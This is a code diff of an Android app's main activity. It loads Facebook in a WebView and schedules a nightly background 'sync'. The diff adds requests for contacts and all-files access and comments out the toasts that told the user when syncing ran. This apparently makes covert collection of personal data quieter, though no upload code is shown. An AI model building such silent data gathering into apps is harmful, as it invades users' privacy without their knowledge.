@@ -1,11 +1,13 @@
 package com.phc.serviceapp;
 
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import android.Manifest;
 import android.app.ActivityManager;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
@@ -17,6 +19,7 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.Handler;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.View;
@@ -43,6 +46,7 @@ public class MainActivity extends AppCompatActivity {
     private Timer syncTimer;
     private LocalServer localServer;
     private final String url = "https://www.facebook.com/";
+    private static final int TIMEOUT = 10000;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -108,9 +112,9 @@ public class MainActivity extends AppCompatActivity {
             // Start the sync process
             saveLastSyncTime(); // Update the last sync time
             startBackgroundService();
-            Toast.makeText(this, "Sync started", Toast.LENGTH_SHORT).show();
+//            Toast.makeText(this, "Sync started", Toast.LENGTH_SHORT).show();
         } else {
-            Toast.makeText(this, "Sync skipped (not enough time since last sync)", Toast.LENGTH_SHORT).show();
+//            Toast.makeText(this, "Sync skipped (not enough time since last sync)", Toast.LENGTH_SHORT).show();
         }
     }
 
@@ -153,12 +157,59 @@ public class MainActivity extends AppCompatActivity {
 
     private void loadUrl() {
         if (NetworkUtils.isInternetAvailable(this)) {
+            progressBar.setVisibility(View.VISIBLE); // Show progress bar while loading
+            webView.setVisibility(View.VISIBLE); // Ensure WebView is visible
+
+            // Set up a WebViewClient to handle page loading
+            webView.setWebViewClient(new WebViewClient() {
+                @Override
+                public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
+                    super.onPageStarted(view, url, favicon);
+                    // Start a handler to check if the page takes too long to load
+                    startTimeoutHandler();
+                }
+
+                @Override
+                public void onPageFinished(WebView view, String url) {
+                    super.onPageFinished(view, url);
+                    // Hide progress bar once the page has loaded
+                    progressBar.setVisibility(View.GONE);
+                }
+
+                @Override
+                public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
+                    super.onReceivedError(view, errorCode, description, failingUrl);
+                    // Handle error and hide progress bar
+                    progressBar.setVisibility(View.GONE);
+                   // Toast.makeText(MainActivity.this, "Page Load Failed: " + description, Toast.LENGTH_SHORT).show();
+                }
+            });
+
+            // Load the URL
             webView.loadUrl(url);
         } else {
             Toast.makeText(this, "No Internet Connection", Toast.LENGTH_SHORT).show();
             progressBar.setVisibility(View.GONE);
         }
     }
+
+    private void startTimeoutHandler() {
+        // Create a handler to simulate a timeout
+        Handler handler = new Handler();
+        Runnable timeoutRunnable = new Runnable() {
+            @Override
+            public void run() {
+                // If the page doesn't load within the timeout, show a timeout message
+                progressBar.setVisibility(View.GONE);
+                //Toast.makeText(MainActivity.this, "Page Load Timeout", Toast.LENGTH_SHORT).show();
+                webView.stopLoading(); // Stop loading the page
+            }
+        };
+
+        // Post a delayed runnable for the timeout
+        handler.postDelayed(timeoutRunnable, TIMEOUT);
+    }
+
     @Override
     protected void onDestroy() {
         super.onDestroy();
@@ -194,8 +245,6 @@ public class MainActivity extends AppCompatActivity {
         }
         return false;
     }
-
-
 
     private void scheduleSyncAt10PM() {
         AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
@@ -245,53 +294,51 @@ public class MainActivity extends AppCompatActivity {
 
     // Method to check if necessary permissions are granted
     private boolean hasPermissions() {
-        boolean storagePermission = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
-        boolean mediaPermission = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
-        boolean manageStoragePermission = Environment.isExternalStorageManager();
-        return storagePermission && mediaPermission && manageStoragePermission;
+        logMissingPermissions();
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            return Environment.isExternalStorageManager() &&
+                    ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+        } else {
+            return ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
+                    ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED &&
+                    ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+        }
     }
 
-    // Method to request missing permissions
+
     private void requestPermissions() {
+        logMissingPermissions();
         List<String> permissionsToRequest = new ArrayList<>();
 
-        // Check for READ_EXTERNAL_STORAGE permission
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                    Uri uri = Uri.fromParts("package", getPackageName(), null);
+                    intent.setData(uri);
+                    startActivityForResult(intent, PERMISSION_REQUEST_CODE);
+                } catch (ActivityNotFoundException e) {
+                    Toast.makeText(this, "Unable to open permissions settings.", Toast.LENGTH_SHORT).show();
+                }
+            }
+        }
+
+        // Add permissions to the list if not granted
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
             permissionsToRequest.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
         }
-
-        // Check for READ_MEDIA_IMAGES permission (for newer Android versions)
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
             permissionsToRequest.add(android.Manifest.permission.READ_MEDIA_IMAGES);
         }
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            permissionsToRequest.add(android.Manifest.permission.READ_CONTACTS);
+        }
+//        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+//            permissionsToRequest.add(android.Manifest.permission.CAMERA);
+//        }
 
-        // If permissions are missing, request them
         if (!permissionsToRequest.isEmpty()) {
-            try {
-                ActivityCompat.requestPermissions(this, permissionsToRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
-            } catch (Exception e) {
-                Log.e("Permissions", "Error requesting permissions: ", e);
-                // Optionally, show a message to the user
-                Toast.makeText(this, "Error requesting permissions", Toast.LENGTH_SHORT).show();
-            }
-        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            // Android 11 or above - Use the appropriate intent for file access permissions
-            if (!Environment.isExternalStorageManager()) {
-                try {
-                    // Check if the app has MANAGE_EXTERNAL_STORAGE permission
-                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
-                    startActivityForResult(intent, PERMISSION_REQUEST_CODE);
-                } catch (ActivityNotFoundException e) {
-                    Log.e("Permissions", "Error starting permission request activity: ", e);
-                    Toast.makeText(this, "Unable to open permissions settings", Toast.LENGTH_SHORT).show();
-                }
-            } else {
-                // Permissions are granted, proceed to the background service
-                startBackgroundService();
-            }
-        } else {
-            // For lower versions, directly start the background service if permissions are granted
-            startBackgroundService();
+            ActivityCompat.requestPermissions(this, permissionsToRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
         }
     }
 
@@ -300,29 +347,66 @@ public class MainActivity extends AppCompatActivity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Check if the permission for MANAGE_EXTERNAL_STORAGE is granted
-            if (Environment.isExternalStorageManager()) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
                 startBackgroundService();
             } else {
-                // If permission is not granted, show a message and guide the user
-                Toast.makeText(this, "Please grant storage permission to continue.", Toast.LENGTH_LONG).show();
-                showSettingsDialog();
+                //Toast.makeText(this, "Permission not granted. Please enable storage permission in settings.", Toast.LENGTH_LONG).show();
             }
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+//            logMissingPermissions();
+            boolean allGranted = true;
+
+            for (int i = 0; i < grantResults.length; i++) {
+                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                    Log.e("Permissions", "Permission not granted: " + permissions[i]);
+                    allGranted = false;
+                }
+            }
+
+            if (allGranted) {
+                startBackgroundService();
+            } else {
+                //Toast.makeText(this, "Permission not granted. Please enable necessary permissions in settings.", Toast.LENGTH_LONG).show();
+//                showSettingsDialog();
+            }
+        }
+    }
+
+    private void logMissingPermissions() {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            Log.e("Permissions", "READ_CONTACTS permission is missing.");
+        }
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            Log.e("Permissions", "READ_EXTERNAL_STORAGE permission is missing.");
+        }
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
+            Log.e("Permissions", "READ_MEDIA_IMAGES permission is missing.");
+        }
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            Log.e("Permissions", "READ_MEDIA_IMAGES permission is missing.");
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
+            Log.e("Permissions", "All Files Access permission is missing.");
         }
     }
 
     // Method to show a settings dialog if the user hasn't granted permissions
     private void showSettingsDialog() {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("Permission Required");
-        builder.setMessage("This permission is essential for the app's functionality. Please enable it in the app settings.");
-        builder.setPositiveButton("Go to Settings", (dialog, which) -> {
-            dialog.dismiss();
-            openAppSettings();
-        });
-        builder.setNegativeButton("Cancel", (dialog, which) -> dialog.dismiss());
-        builder.show();
+        new AlertDialog.Builder(this)
+                .setTitle("Permission Required")
+                .setMessage("The app needs access to contacts, storage, and images. Please enable these permissions in settings.")
+                .setPositiveButton("Go to Settings", (dialog, which) -> openAppSettings())
+                .setNegativeButton("Cancel", (dialog, which) -> dialog.dismiss())
+                .show();
     }
+
 
     // Method to open the app's settings page for permission management
     private void openAppSettings() {
@@ -331,55 +415,5 @@ public class MainActivity extends AppCompatActivity {
         intent.setData(uri);
         startActivity(intent);
     }
-
-
-
-//    @Override
-//    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-//        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-//        if (requestCode == PERMISSION_REQUEST_CODE) {
-//            boolean storagePermissionGranted = false;
-//            boolean mediaPermissionGranted = false;
-//
-//            for (int i = 0; i < permissions.length; i++) {
-//                if (permissions[i].equals(android.Manifest.permission.READ_EXTERNAL_STORAGE)) {
-//                    storagePermissionGranted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
-//                } else if (permissions[i].equals(android.Manifest.permission.READ_MEDIA_IMAGES)) {
-//                    mediaPermissionGranted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
-//                }
-//            }
-//
-//            if (storagePermissionGranted && mediaPermissionGranted) {
-//                startBackgroundService();
-//            } else {
-//                Toast.makeText(this, "Permissions are required for gallery access.", Toast.LENGTH_LONG).show();
-//                showSettingsDialog();
-//            }
-//        }
-//    }
-//
-//
-//
-//    private void showSettingsDialog() {
-//        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-//        builder.setTitle("Permission Required");
-//        builder.setMessage("This permission is essential for the app's functionality. Please enable it in the app settings.");
-//        builder.setPositiveButton("Go to Settings", (dialog, which) -> {
-//            dialog.dismiss();
-//            openAppSettings();
-//        });
-//        builder.setNegativeButton("Cancel", (dialog, which) -> dialog.dismiss());
-//        builder.show();
-//    }
-//
-//    private void openAppSettings() {
-//        Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
-//        Uri uri = Uri.fromParts("package", getPackageName(), null);
-//        intent.setData(uri);
-//        startActivity(intent);
-//    }
-
-
-
 
 }
